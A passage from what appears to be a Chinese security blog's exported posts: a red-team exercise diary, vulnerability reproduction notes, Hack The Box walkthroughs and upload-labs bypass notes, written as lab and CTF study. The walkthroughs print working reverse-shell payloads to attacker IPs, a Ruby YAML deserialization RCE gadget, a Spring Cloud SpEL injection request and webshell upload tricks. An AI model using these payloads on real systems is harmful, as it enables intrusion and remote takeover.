2023年7月21日19:58:59 去找一下XX公司的后台，是邮箱登录的 批量跑一下XX公司的邮箱 2023年7月22日11:19:39 今天遇到了一点麻烦，拓展坞的网口坏了，得重新购买一个，幸亏，京东有次日达。队友也好心借给我一个拓展坞，但我只有一个Type-C接口，要么充电、要么联网…… 霉运袭来，平台密码总是忘记，导致裁判几乎每个人都认识我。 现在的任务有三条 水群 找XX公司的邮箱 找XX公司的后台 时刻录屏 2023年7月22日15:18:59 我点击木马之后，出现的上线通知 2023年7月22日15:45:11 购买126邮箱 ➜ ✅ 携程的邮箱 2023年7月22日19:09:31 谷歌语法看PDF泄露 2023年7月22日19:45:24 拼多多资产，队友搜集出来的，找出重点资产，把所有文件的域名提取出来，然后跑指纹识别 插曲：出现CS上线 ➜ 权限维持 2023年7月23日10:10:35 XX公司的数据 XX公司的 IP 去重复，扔 goby 里面跑 2023年7月23日14:50:24 写报告，写完啦 2023年7月23日14:50:30 找一下XX公司人名的微信号 MP4 图标 ICO MSF 等上线 2023年7月23日16:08:32 会不会钓鱼！忽悠他，发EXE 攻防演练非常激烈，有一家红队，解锁了全部的公司，超前完成任务（可能是微步在线） 2023年7月24日15:09:11 跑子域名 关于攻击守则的再次强调声明 1.攻击禁止影响业务正常运行 2.禁止擅自修改密码，如必要，提交攻击申请 3.禁止场外攻击 4.报告中重要截图需包含时间戳 5.**行动期间需要在录屏前提下进行 6.禁止使用场外攻击资源 公告关于每日结束后的提醒 请各位红队选手，为配合场地消防安排，在每日完成攻击后，将操作台上的电源关闭或拔出。务必保存好自己当天晚上编写的相关报告及录屏等内容，工作人员将在全员离场后进行检查，如发现电源未关闭，工作人员将拔出，请各位攻击队注意！ 警告关于钓鱼攻击方式的新要求 今日起所有钓鱼攻击，请各位攻击队优先递交攻击申请或钓鱼内容说明，通过后才可执行。若今日已经发送的钓鱼攻击，请在平台补充递交攻击申请。 注意事项 自动提取域名工具 确保使用适当工具从网页文本中提取顶级根域名或主域名。 提前登录 使用的平台：如“天眼查”、“企查查”等。 注意事项（因为不让带手机into……）： QQ 邮箱：网络问题可能导致无法登录。 谷歌账号：需进行二次验证。 环境配置 提前搭建虚拟机、云服务器等必要环境。 网络问题 关注拓展坞的网口问题。 录屏软件 熟悉使用录屏软件，确保操作记录清晰。 虚拟机搭建 根据需要创建多个虚拟机，实际上我们队友都是用的本机，lol，用虚拟机方便清空现场资料，对方不让带走！！","tags":["攻防演练"],"categories":["网络安全"]},{"title":"已知漏洞复现与验证","path":"/2023/03/09/Reproducible vulnerability/","content":"以下是一些已知的漏洞及其相关信息，供研究和复现使用 CVE-2019-6341✔ 在 kali 上使用 vulhub 环境，先进入目录vulhub/drupal/CVE-2019-6341 # 启动 docker，启用环境 sudo service docker start docker-compose up -d 在浏览器访问：http://127.0.0.1:8080 # 上传 POC php blog-poc.php 127.0.0.1 8080 # 访问，FireFox 过滤了 XSS，所以不弹窗 http://127.0.0.1:8080/sites/default/files/pictures/2023-02/_0 漏洞利用 drupal 文件上传模块，文件内容是 HTML 代码，但 JS 代码包含其中 &lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt; CVE 2014-4210✔ vulhub/weblogic/ssrf at master · vulhub/vulhub (github.com) 在 kali 上使用 vulhub 环境，先进入目录vulhub/weblogic/ssrf # 启动 docker，启用环境 sudo service docker start docker-compose up -d Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意 HTTP 请求，进而攻击内网中 redis、fastcgi 等脆弱组件。 访问http://127.0.0.1:7001/uddiexplorer/，查看 uddiexplorer 应用。 点击 Search Public Registries 进行抓包 未完…… thinkcmf-x1.6.0-x2.2.3✔ ThinkCMF 是一个基于 ThinkPHP 框架开发的内容管理框架。可利用此漏洞构造恶意的url，向服务器写入任意内容的文件，达到远程代码执行的目的 下载ThinkCMF2.2.2版本，X2.2.2 ·ThinkCMF/CMFX (github.com)，解压后放到 phpstudy 环境的 web 根目录下 然后，输入数据库密码 root，设置用户名、密码、邮箱等完成安装设置 log4j2-cve-2021-44228✔ 环境搭建 使用 vulhub，切换到漏洞目录 cd /root/vulhub/log4j/CVE-2021-44228 漏洞复现 先利用 dnslog 查看回显，然后测试网站 http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://f4ae3u.dnslog.cn&#125; 工具使用https://github.com/bkfish/Apache-Log4j-Learning/ git clone https://github.com/bkfish/Apache-Log4j-Learning.git 构造 payload 使用 base 64加密 bash -i &gt;&amp; /dev/tcp/192.168.31.137/8983 0&gt;&amp;1 …… XXE 漏洞 | rrodrigo/xxelab✔ 环境搭建 # 下载镜像 docker pull rrodrigo/xxelab docker run -d -p 8082:80 rrodrigo/xxelab 将主机的 8082 端口映射到容器的 80 端口上，在浏览器中访问映射出来的端口，http://localhost:8082 漏洞复现 通过用 burp 抓包发现是 xml 格式 &lt;!DOCTYPE c [ &lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt; # 定义了一个名为 file 的实体，它的值是 /etc/passwd，这是一个包含系统用户信息的文件。 Tips / 提示 在 XML 中，实体是可以被引用的对象，类似于变量。当 XML 解析器解析包含该实体的 XML 文档时，它会将实体引用替换为实体的实际值。攻击者可以构造恶意的 XML 数据，将实体引用插入到数据中，从而让 XML 解析器读取和输出 /etc/passwd 文件的内容。 CVE-2017-12615（tomcat-pass-getshell） 环境搭建 使用 vuluhub 的 docker 进行漏洞复现 漏洞复现 …… CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台 先找到目录：vulhub/weblogic/CVE-2020-14882 cd vulhub/weblogic/CVE-2020-14882 docker-compose up –d 2.进入 vulhub/weblogic/CVE-2020-14882 目录下，使用命令docker-compose up –d启动环境 3.浏览器访问：你的 ip:7001/console/login/LoginForm.jsp 成功访问表示环境搭建成功 log4j2-rce-2021-12-09 环境搭建 # 使用docker docker pull vulfocus/log4j2-rce-2021-12-09 # 启动docker容器 docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09 漏洞复现 ……未完待续 wordpress_cve_2019_15866 showdoc-cnvd_2020_26585 CVE-2019-9670（远程代码执行漏洞复现） CVE-2020-5412 phpmyadmin-cve_2014_8959","tags":["CVE"],"categories":["漏洞复现"]},{"title":"Precious — Hack The Box Machine","path":"/2023/03/08/Precious/","content":"介绍 在虚拟机中进行连接 sudo openvpn 名称.ovpn 出现 Initialization Sequence Completed 代表连接成功 连接 参考： 主要参考——Hackthebox - Precious(Easy) - YouTube PreciousHTB | Hack The Box Precious| PreciousWriteUp | Hack The Box - YouTube Precious- YouTube 中等 (medium.com) Hackthebox PreciousWriteup – 0xDedinfosec Precious是 Hack the Box 上的一台简单机器，它托管了一个使用易受攻击的 pdfkit 版本的网站。使用此版本的 pdf kit 和 CVE-2022–25765，我们能够以 ruby 用户的身份获得计算机的反向 shell。然后，我们从配置文件中收集一些信息，以将我们的权限提升给其他用户。一旦我们成为用户 henry，我们就通过 YAML 反序列化使用远程代码执行将我们的权限提升给根用户。 地址：https://app.hackthebox.com/machines/513 10.10.11.189 常规探测 # nmap 全端口扫描，发现开放了 22 和 80 端口，分别是 ssh 和 http 协议 # -sC：运行端口侦测的默认 Nmap 脚本 # -sV：探测开放端口以确定服务/版本信息 nmap -sC -sV 10.10.11.189 10.10.11.189:22 10.10.11.189:80 网站能够输入一个 URL，它会将网页转换为 pdf exiftool iza6l21cttk715syc00tn5uzd4t4hgqz.pdf Google 直接搜索 pdfkit v0.8.6 vuln、pdfkit v0.8.6 exploit（意思就是搜索和 pdfkit v0.8.6 相关的漏洞 ） Command Injection in pdfkit | CVE-2022-25765 | Snyk ==找到了 PoC，把要执行的命令放在``中== 反弹 shell https://www.revshells.com/ # 需要设置一个侦听器，以便在获得反向 shell 后与机器进行交互。 nc -nlvp 1113 # 构造一个 payload python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)' # 放入浏览器 http://10.10.16.13?name=#&#123;'%20`放入 payload`'&#125; http://10.10.16.13?name=#&#123;'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'`'&#125; 输入whoami，将会显示rudy 提权 # ssh 登录 ssh henry@10.10.11.189 # 密码： Q3c1AqGHtoI0aXAYFH cat user.txt 得到 flag 现在可以访问用户 henry，试一下可以用 root 权限运行吗，利用sudo -l -bash-5.1$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb -bash-5.1$ 通过 YAML 远程执行代码的文章，发现可以通过 dependencies.yml 文件使用远程代码注入，该文件将由 /opt/update_dependencies.rb 运行 根据 sudo -l 命令的返回结果 这说明你的目标机器上的用户 henry 可以使用 sudo 命令来以 root 权限运行以下命令，而不需要输入密码： /usr/bin/ruby /opt/update_dependencies.rb 复制 这可能是一个提权的机会，如果你可以控制或者修改 /opt/update_dependencies.rb 这个文件，或者利用 ruby 的特性来执行任意命令。你可以尝试以下方法： cat /opt/update_dependencies.rbcat # 发现 YAML.load(File.read(&quot;dependencies.yml&quot; )) 字段 test file .yml 使用 nano 编辑器 在 nano 编辑器中，按下 Ctrl+O 组合键，这会提示你输入要保存的文件名。如果你不想改变文件名，直接按下 Enter 键即可。 如果你想要退出 nano 编辑器，按下 Ctrl+X 组合键，这会提示你是否要保存修改。如果你想要保存，按下 Y 键，然后按下 Enter 键。如果你不想要保存，按下 N 键。 # 将 /tmp/1 添加到 PATH，您可以使系统能够在该目录中查找并执行命令。 export PATH=/tmp/1:$PATH echo $PATH Google 搜索：file yml rce https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/ https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e56 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module 'Kernel' method_id: :system git_set: sh method_id: :resolve # 执行我们的命令 sudo /usr/bin/ruby /opt/update_dependencies.rb pwd;id;whoami;ls -la;file root.txt","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"MonitorsTwo — Hack The Box Machine","path":"/2023/03/06/MonitorsTwo/","content":"介绍 破解盒子 ：： 破解盒子 (hackthebox.com) 10.10.11.211 参考 hackthebox MonitorsTwo渗透全过程 - YouTube htb monitorstwo wp记录_春猿火的博客-CSDN博客 MonitorsTwo WriteUp_Som3B0dy的博客-CSDN博客 FredBrave/CVE-2022-46169-CACTI-1.2.22：这是 CVE-2022-46169 对仙人掌 1.2.22 的攻击。此漏洞允许通过 RCE 获取计算机上的反向外壳。 (github.com) UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) 探测 nmap -A 10.10.11.211 底部看到版本信息——版本 1.2.22 | © 2004-2023 - The Cacti Group Google 搜索：The Cacti Group exploit CVE-2022-46169 反连 shell # 监听 nc -nlvp 443 # 本机 git clone 把 python 脚本下载下载并且运行 python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443 #-u http://10.10.11.211: 指定目标 URL 为 http://10.10.11.211。测试的目标网站 #--LHOST=10.10.14.29: 指定本地主机的 IP 地址为 10.10.14.29。反向连接的 IP 地址。 -#-LPORT=443: 指定本地主机的端口号为 443。接收反向连接的端口号。 cd / cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo &quot;database is connected&quot; if [[ ! $(mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;) =~ &quot;automation_devices&quot; ]]; then mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e &quot;UPDATE user_auth SET must_change_password='' WHERE username = 'admin'&quot; mysql --host=db --user=root --password=root cacti -e &quot;SET GLOBAL time_zone = 'UTC'&quot; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ &quot;$&#123;1#-&#125;&quot; != &quot;$1&quot; ]; then set -- apache2-foreground &quot;$@&quot; fi exec &quot;$@&quot; # ------------------------------------------------------------------------------------------------- # 这个脚本的功能是等待数据库可用后，检查指定的表是否存在，如果不存在，则导入 SQL 文件并更新数据库中的记录。然后设置目录权限并执行传递给脚本的命令行参数。 find / -perm -u=s 2&gt;/dev/null # find: 命令用于在文件系统中查找文件和目录。 # /: 指定查找的起始路径为根目录。 # -perm -u=s: 指定查找具有 Setuid 权限的文件。-perm 选项用于指定文件权限，-u 表示针对文件所有者的权限，=s 表示设置了 Setuid 权限的文件。 # 2&gt;/dev/null: 将错误输出重定向到 /dev/null，即丢弃错误信息，以避免显示不必要的错误提示。 /sbin/capsh --gid=0 --uid=0 -- # 以 root 用户的身份运行 /sbin/capsh 工具，以便在修改进程权限和能力时拥有 root 权限 whoami # 复制 entrypoint.sh 文件的命令 mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot; mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot; # 找到 marcus 用户的密码 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C # 本机 hashcat -m 3200 -a 0 pass.txt /home/aloof/zidm/common-password-list/rockyou.txt # 使用 hashcat 工具对 `pass.txt` 文件中的 bcrypt 哈希值进行直接字典攻击，并使用 `/home/aloof/zidm/common-password-list/rockyou.txt` 字典文件 ssh marcus@10.10.11.211 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 用户名 密码 明文 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C funkymonkey # www-data 用户 cd / cd bin ls -al | grep bash chmod u+s bash UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) # 本机 git clone https://github.com/UncleJ4ck/CVE-2021-41091.git ifconfig sudo python3 -m http.server # marcus ./exp.sh chmod +x exp.sh","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Inject — Hack The Box Machine","path":"/2023/03/03/Inject/","content":"https://app.hackthebox.com/machines/Inject 参考： Google 搜索：Inject Hack The Box https://blog.csdn.net/qq_58869808/article/details/129505388 ^v^ (cnblogs.com) HTB-Inject_永远是深夜有多好。的博客-CSDN博客 视频： https://www.youtube.com/watch?v=SU_hAavi9Oo&amp;pp=ygURaW5qZWN0IGhhY2t0aGVib3g%3D 连接 使用环境 VM ubuntu sudo openvpn lab_Wreath0690.ovpn 10.10.11.204 侦查 # 初始端口扫描 nmap -A 10.10.11.204 # 仅有 22/tcp 和 8080/tcp 两个端口是开放的，其中22/tcp 端口运行的是 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)，8080/tcp 端口运行的是 Nagios NSCA touch png.png # 创建一个文件进行抓包 文件包含 FUZZ 路径，一层一层进行遍历，找到了 pom.xml 文件，发现 java 框架去 Google 搜索 EXP 密码：DocPhillovestoInject123 用户：phil # ssh phil@10.10.11.204，连接不上 # 执行命令 curl http://10.10.11.204:8080/show_image?img=pass1.jpg?pass=id 得到了文件的绝对路径 /var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id &#123;&quot;timestamp&quot;:&quot;2023-05-19T02:46:22.638+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;URL [file:/var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id] cannot be resolved in the file system for checking its content length&quot;,&quot;path&quot;:&quot;/show_image&quot;&#125;root@aloof-virtual-machine:/home/aloof/tools# 反向 shell 通过搜索找到 CVE 编号是「CVE-2022-22963」 CVE-2022-22963 是一个在 Spring Cloud Function 框架中存在的远程代码执行漏洞。它影响了3.1.6、3.2.2及更早的版本 当使用路由功能时，用户可以提供一个特制的 SpEL 作为路由表达式，可能导致远程代码执行和访问本地资源。 Vulhub - Docker-Compose file for vulnerability environment curl http://10.10.11.204:8080/show_image?img=../../../../WebApp/pom.xml # 返回信息，版本满足要求 &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; 使用 burp 抓http://10.10.11.204:8080的数据包 GET / HTTP/1.1 Host: 10.10.11.204:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Vulhub 上的 POST /functionRouter HTTP/1.1 Host: localhost:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;) Content-Type: text/plain Content-Length: 4 test 修改后 https://www.revshells.com/ bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1 # 通过 base64 加密 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE= # 监听端口，获得 shell 权限 nc -nvlp 9001 修改后的请求包 POST /functionRouter HTTP/1.1 Host: 10.10.11.204:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept: */* Accept-Language: en Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;) Content-Type: text/plain Content-Length: 4 test spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;) # 这段代码是一个 HTTP 请求头的参数，它的名字是 spring.cloud.function.routing-expression，它的值是一个SpEL表达式。SpEL表达式是一种可以执行任意Java代码的语言. # 这个SpEL表达式的作用是调用java.lang.Runtime类的getRuntime()方法，得到一个Runtime对象，然后调用它的exec()方法，执行一个命令行。这个命令行是我们自己可以控制的地方 bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; # 这个命令行的作用是先用 echo 命令输出一串 base64 编码的字符串，然后用 base64 命令解码它，然后用 bash 命令执行它 bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1 # 这个命令的作用是启动一个交互式的 bash shell，并且把它的输入和输出重定向到一个TCP连接上，连接的目标地址是 10.10.16.39:9001。这样就相当于在服务器上开启了一个反向 shell，攻击者可以在 10.10.16.39:9001 上监听并控制服务器。 # 所以，这段代码的目的是利用 Spring Cloud Function 框架中存在的 SpEL 注入漏洞，执行任意代码，并在服务器上开启一个反向 shell，从而获取服务器的完全控制权。 # 连接上之后，通过 whoami 命令发现当前用户是 frank，切换到 phil 用户 密码：DocPhillovestoInject123 用户：phil su phil # 在 /home/phil 目录下发现 user.txt 文件，用 cat 读取文件 提权 使用 sudo -l 发现没有提权的命令 ansible playbook代码来执行shell命令。 Ansible playbook 是一种用来在远程主机上执行一系列任务的文件，它使用YAML语法1。使用Ansible playbook来执行shell命令 - hosts: localhost tasks: - name: getroot command: sudo chmod u+s /bin/bash Playbook 用于将 /bin/bash 文件设置为 SUID 权限，以实现以 root 用户权限执行 Bash shell 的目的 ifconfig # 用sudo权限运行python3的http.server模块1，它可以在本地主机上启动一个简单的HTTP服务器，用来共享文件和目录。 sudo python3 -m http.server # 用wget命令从10.10.16.39:8000这个地址下载playbook_2.yml文件，这个地址是上面的HTTP服务器提供的。 wget 10.10.16.39:8000/playbook_2.yml bash -p id whoami cd /root ls cat root.txt","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Busqueda — Hack The Box Machine","path":"/2023/03/01/Busqueda/","content":"连接 https://app.hackthebox.com/machines/Busqueda 参考： 靶场笔记-HTB Busqueda - FreeBuf网络安全行业门户 htb busqueda wp要点记录_春猿火的博客-CSDN博客 https://www.youtube.com/watch?v=I2n4SDUXEYI https://ratil.life/hack-the-box-busqueda/ https://blog.213.se/busqueda-hackthebox/ sudo openvpn lab_Wreath0690.ovpn 10.10.11.208 侦查 # 初始端口扫描 nmap -A 10.10.11.208 # 系统——Ubuntu Searcher 2.4.0 容易受到命令注入的攻击 反弹 shell Google 搜索： “Searchor” poc vulnerabilty exploit “Searchor” exploit POC https://github.com/jonnyzar/POC-Searchor-2.4.2 # 易受攻击的代码包括 eval() 方法： url = eval( f&quot;Engine.&#123;engine&#125;.search('&#123;query&#125;', copy_url=&#123;copy&#125;, open_web=&#123;open&#125;)&quot; ) ', exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);&quot;))# engine=Ask&amp;query=', exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.8',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);&quot;))# # 另一个命令行窗口 nc -lvvp 4444 进入后，有一个用户帐户“svc”，我可以得到“user.txt”。 $ cd /var/www/app $ pwd /var/www/app $ ls app.py templates $ ls -la total 20 drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 . drwxr-xr-x 4 root root 4096 Apr 4 16:02 .. -rw-r--r-- 1 www-data www-data 1124 Dec 1 14:22 app.py drwxr-xr-x 8 www-data www-data 4096 May 15 21:06 .git drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 templates $ cd .git $ ls -la total 52 drwxr-xr-x 8 www-data www-data 4096 May 15 21:06 . drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 .. drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 branches -rw-r--r-- 1 www-data www-data 15 Dec 1 14:35 COMMIT_EDITMSG -rw-r--r-- 1 www-data www-data 294 Dec 1 14:35 config -rw-r--r-- 1 www-data www-data 73 Dec 1 14:35 description -rw-r--r-- 1 www-data www-data 21 Dec 1 14:35 HEAD drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 hooks -rw-r--r-- 1 root root 259 Apr 3 15:09 index drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 info drwxr-xr-x 3 www-data www-data 4096 Dec 1 14:35 logs drwxr-xr-x 9 www-data www-data 4096 Dec 1 14:35 objects drwxr-xr-x 5 www-data www-data 4096 Dec 1 14:35 refs $ cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote &quot;origin&quot;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch &quot;main&quot;] remote = origin merge = refs/heads/main $ **config **文件中拿到用户名密码 username password svc jh1usoih2bkjaspwe92 使用 ssh svc@10.10.11.208 连接用户 svc 提权 svc$ sudo -S -l &gt; [sudo] password for svc: jh1usoih2bkjaspwe92 &gt; ... snip ... &gt; &gt; User svc may run the following commands on busqueda: &gt; (root) /usr/bin/python3 /opt/scripts/system-checkup.py * svc$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd &gt; Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2) &gt; &gt; docker-ps : List running docker containers &gt; docker-inspect : Inpect a certain docker container &gt; full-checkup : Run a full system checkup # 用户 svc 在 busqueda 上具有特权执行脚本 system-checkup.py 的能力 # 用户 svc 试图使用 sudo 执行 /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd 命令，其中 /etc/passwd 被作为参数传递给 system-checkup.py 脚本 # 脚本的用法提示 system-checkup.py 脚本支持以下动作选项： docker-ps：列出正在运行的 Docker 容器。 docker-inspect：检查特定的 Docker 容器。 full-checkup：运行完整的系统检查。 现在需要知道 full-chesckup 子命令的运行方式 创建一个脚本full-checkup.sh，将反向 shell 填充到里面以进行 root 权限升级 touch full-checkup.sh vim full-checkup.sh #!/usr/bin/python3 import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;10.10.16.8&quot;,4441)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty pty.spawn(&quot;sh&quot;) chmod +x full-checkup.sh sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup nc -nlvp 4441 ls /root cat /root/root.txt","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Upload-labs 靶场","path":"/2023/03/01/Upload-labs/","content":"项目地址：https://github.com/c0ny1/upload-labs 一、前端 JS 检测绕过 上传一个 php 文件，失败了，只允许图片为后缀的文件进行上传。这一关的关键是*“JavaScript 代码对文件后缀进行校验”*。JavaScript 属于前端范畴，而前端校验不会发出数据包，不会与服务器进行交互 第一种方式：浏览器直接 F12，找到checkFile()函数，进行删除。更为极端的方法是F12 --&gt; F1 --&gt; 禁用JavaScript，最后上传 PHP 木马 第二种方式：用 burp 拦截上传数据包， 对文件名进行修改 第一种方式： 删除 checkFile() 函数 极端的方法 **第二种方式：**传一个.jpg格式的图片，用 burp 抓包修改文件名和文件内容 二、MIME 类型检测绕过 MIME 是描述*消息内容类型*的因特网标准——MIME 参考手册 Content-Type 通常出现在 HTTP 请求头部中，指示请求的数据类型，或者是数据的 MIME 类型 # 常见的 MIME 类型 text/plain：纯文本 text/html：HTML 格式的文档 image/png：PNG 格式的图片 这一关的关键是，使用Content-Type字段的值判断上传文件是否合法，只允许 image/jpeg、image/png、image/gif 文件的上传 用 burp 截取并修改数据包中的 Content-Type 类型进行绕过 三、后缀检测-黑名单绕过 黑名单绕过的常见方式有： 改变文件后缀名，使用不在黑名单中的文件后缀，例如php2、php3、php4、php5、phtm 拼接文件名 使用压缩文件 修改文件内容 …… 通过 burp 拦截修改数据包中的文件名后缀为.php5 如果服务器是 Apache，也可用.htaccess来进行绕过，但是文件会在上传的过程中修改文件名 四、后缀检测-黑名单绕过（.htaccess） .htaccess文件可以被用来限制特定的文件类型的上传或执行。从源码中得知没有对.htaccess限制 上传.htaccess文件，写入以下内容 # .shell 文件会被解析为 php 文件 AddType application/x-httpd-php .shell 然后上传一个后缀名为.shell的文件，执行 webshell 五、后缀检测-后缀名点空格绕过 双写小数点，. .——中间是空格，围绕着小数点 由于一些操作系统和文件系统*不允许文件名以点号结尾，因此上传时会自动删除*最后一个点号 六、后缀检测-后缀名大小写绕过 观察源代码，发现服务器检查后缀忽视了“大小写”的检测，也就是没出现“strtolower() 函数”。 而“strtolower() 函数”用于将字符串中的所有字符转换为小写字母 七、后缀检测-后缀名空格绕过 观察源代码，发现服务器检查后缀忽视了“空格”的检测，也就是没出现“trim() 函数”。 trim()是 PHP 中的一个字符串函数，用于*删除字符串首尾的空格*或其他指定字符 理应加上$file_ext = trim($file_ext); 八、后缀检测-后缀名点绕过 观察源代码，发现服务器检查后缀忽视了“后缀名点”的检测，也就是没出现“deldot() 函数”。 deldot()函数用于在文件上传*防止后缀名点绕过攻击*。该函数的作用是将文件名中的所有点（包括后缀名点和其他点）都删除，以确保文件名的完整性和正确性。 上传文件并用 burp 抓包，在文件名中添加*额外的点*来绕过文件扩展名的检查 九、后缀检测-特殊字符串 可以通过在文件名中添加::$DATA来告诉 Windows 访问文件的资源，并将其当作可执行代码来执行 十、后缀检测-点空格绕过 同第五关 观察代码，发现先删除文件名末尾点.，再首尾去空格，由此想到 双写小数点，. .——中间是空格，围绕着小数点 十一、后缀检测-后缀名双写绕过 使用了str_ireplace()函数，替换成空，可以用双写绕过 上传文件名 code.p.phphp，上传文件时会删除 .php，最后的上传文件名： code.php 十二、后缀检测-GET方式00截断 %00 截断，用在 php 版本 5.3.29以下，magic_quotes_gpc 为 Off 状态 通过抓包，能够看到上传路径，使用 00 截断，抓包修改上传路径save_path=../upload/code.php%00，即可绕过。 “00截断”（Null byte injection）是一种 Web 应用程序安全漏洞，攻击者通过在输入数据中插入 ASCII 码为 0 的 null 